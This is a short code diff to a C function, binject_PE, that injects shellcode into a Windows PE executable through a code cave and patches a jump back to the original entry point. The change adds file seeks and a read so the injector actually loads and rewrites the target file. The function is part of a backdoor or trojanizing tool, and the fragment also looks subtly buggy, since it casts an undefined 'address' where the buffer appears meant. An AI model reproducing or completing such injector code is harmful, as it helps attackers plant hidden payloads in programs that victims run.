@@ -13,6 +13,8 @@ int binject_PE(char *file,char *shellcode,int method)
   fseek(f,0,SEEK_END);
   size=ftell(f);
   char *file_buffer = calloc(1,size);
+  fseek(f,0,SEEK_SET);
+  fread(file_buffer,1,size,f);
   PIMAGE_DOS_HEADER dos = (struct PIMAGE_DOS_HEADER *)address;
 	
   if(method==CODE_CAVE)
@@ -34,6 +36,7 @@ int binject_PE(char *file,char *shellcode,int method)
 					sclen+=5;
 					char *shellcodefixed =ApplySuffixJmpIntel64(shellcode, x,oryginal_entry,0 );
 					memcpy(file_buffer+x,shellcodefixed,sclen);
+					fseek(f,0,SEEK_SET);
 					fwrite(file_buffer,1,size,f);
 					free(shellcodefixed);
 					free(file_buffer);
